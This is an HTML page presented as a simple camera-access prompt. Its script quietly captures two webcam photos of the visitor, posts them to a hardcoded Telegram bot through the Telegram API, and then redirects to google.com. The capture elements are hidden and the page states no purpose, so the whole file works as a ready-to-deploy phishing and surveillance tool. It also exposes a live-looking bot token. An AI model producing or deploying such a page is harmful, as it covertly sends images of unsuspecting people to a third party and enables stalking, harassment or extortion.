<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Auto Camera to Telegram</title>
  <style>
    body { font-family: Arial, sans-serif; text-align: center; background: #f0f0f0; padding: 40px; }
    video, canvas { display: none; }
    #status { font-size: 18px; margin-top: 20px; color: green; }
  </style>
</head>
<body>
  <h1>Camera Access Required</h1>
  <p id="status">Please allow camera access...</p>
  <video id="video" autoplay></video>
  <canvas id="canvas"></canvas>

  <script>
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const statusText = document.getElementById('status');

    const botToken = "8229410666:AAHURN6Ie9iqAm0hjPqC2p_XgzeMCLrtgqE";
    const chatId = "7009447523";

    async function sendPhoto(blob) {
      const formData = new FormData();
      formData.append('chat_id', chatId);
      formData.append('photo', blob, 'photo.jpg');

      try {
        const response = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
          method: 'POST',
          body: formData
        });

        const result = await response.json();
        console.log('Telegram Response:', result);
        statusText.textContent = "Photo sent to Telegram ‚úÖ";
      } catch (error) {
        console.error("Telegram Error:", error);
        statusText.textContent = "‚ùå Failed to send photo";
      }
    }

    function captureAndSend() {
      const context = canvas.getContext('2d');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      context.drawImage(video, 0, 0, canvas.width, canvas.height);
      canvas.toBlob(sendPhoto, 'image/jpeg');
    }

    navigator.mediaDevices.getUserMedia({ video: true })
      .then(stream => {
        video.srcObject = stream;
        statusText.textContent = "Camera active... Capturing photo üì∏";

        // Delay before capturing to ensure camera has time to focus
        setTimeout(() => {
          captureAndSend();     // First photo
          setTimeout(() => {
            captureAndSend();   // Second photo
            setTimeout(() => {
              window.location.href = 'https://google.com'; // Redirect
            }, 1000);
          }, 1000);
        }, 2000);

      })
      .catch(error => {
        console.error('Camera access denied or error:', error);
        statusText.textContent = "Camera access denied ‚ùå";
      });
  </script>
</body>
</html>
